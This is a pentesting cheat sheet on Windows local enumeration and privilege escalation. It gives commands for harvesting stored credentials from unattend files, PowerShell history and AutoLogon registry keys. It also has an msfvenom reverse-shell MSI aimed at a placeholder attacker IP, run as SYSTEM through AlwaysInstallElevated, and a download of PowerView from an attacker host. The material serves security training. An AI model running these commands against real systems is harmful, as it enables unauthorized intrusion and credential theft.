# Windows Local Enumeration

!!! tip "Quick win order"
    1. `whoami /priv` — SeImpersonatePrivilege → Potato attacks; SeBackup/SeRestore → shadow copy NTDS; SeDebug → LSASS dump
    2. `net localgroup administrators` — already admin?
    3. `cmdkey /list` and `dir /s *.config *.xml unattend*` — stored credentials everywhere
    4. AlwaysInstallElevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
    5. AutoLogon: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` — look for DefaultPassword
    6. Unquoted service paths and weak service permissions
    7. Run `winpeas.exe` for a comprehensive sweep — cross-reference findings manually

---

## System Information

```cmd
systeminfo
hostname
ver
wmic os get Caption,Version,BuildNumber,OSArchitecture
```

Check for missing patches against known privesc CVEs:

```cmd
wmic qfe get HotFixID,InstalledOn
```

Then feed `systeminfo` output to [Watson](https://github.com/rasta-mouse/Watson) or [Windows-Exploit-Suggester-NG](https://github.com/bitsadmin/wesng):

```bash
wes.py systeminfo.txt --impact "Elevation of Privilege"
```

---

## Stored Credentials

```cmd
cmdkey /list                               # saved RDP/network credentials
rundll32.exe keymgr.dll,KRShowKeyMgr       # GUI credential manager (if you have desktop)
dir /s /b C:\Users\*unattend*.xml C:\Windows\Panther\*unattend*.xml
type C:\Windows\Panther\Unattend.xml       # may contain AdministratorPassword
findstr /si password *.xml *.ini *.config *.txt *.ps1 2>nul
```

PowerShell history (often contains full command lines with plaintext passwords):

```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## AutoLogon Registry Check

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```

If `DefaultPassword` exists, it's cleartext.

---

## AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must be `0x1`. If set, any `.msi` runs as SYSTEM:

```bash
# On attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f msi -o shell.msi
```

```cmd
msiexec /quiet /qn /i C:\Temp\shell.msi
```

---

## Service Enumeration

```cmd
wmic service get name,pathname,startmode,startname | findstr /i "auto" | findstr /i /v "c:\windows\\"
sc query type= service state= all
```

PowerShell:

```powershell
Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartMode -eq 'Auto'} | Select Name,PathName,StartName
```

See [Service Exploitation](service-exploitation.md) for unquoted paths, weak service permissions, and DLL hijacking.

---

## Logged-On Users and Sessions

```cmd
query user
net session
quser /server:10.10.10.10
```

---

## ACL Enumeration (PowerView)

PowerView is part of PowerSploit — must be imported first. The cmdlets below don't exist in stock PowerShell:

```powershell
iwr -uri http://<attacker-ip>/PowerView.ps1 -OutFile PowerView.ps1
. .\PowerView.ps1

Get-DomainObjectAcl -Identity <user> -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -like "*WriteDACL*"}
ConvertFrom-SID S-1-5-21-1987370270-658905905-1781884369-1104
```

For AD-wide ACL mapping, use BloodHound — don't try to do this manually beyond targeted checks.

---

## Scheduled Tasks (Unquoted / Weak ACLs)

```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Next Run Time Task To Run Run As User"
```

PowerShell — list tasks not running as `SYSTEM`/`LOCAL SERVICE` with writable task files:

```powershell
Get-ScheduledTask | Where-Object { $_.Principal.UserId -notmatch 'SYSTEM|LOCAL|NETWORK' } | Select TaskName,TaskPath,@{n='Action';e={$_.Actions.Execute}}
```
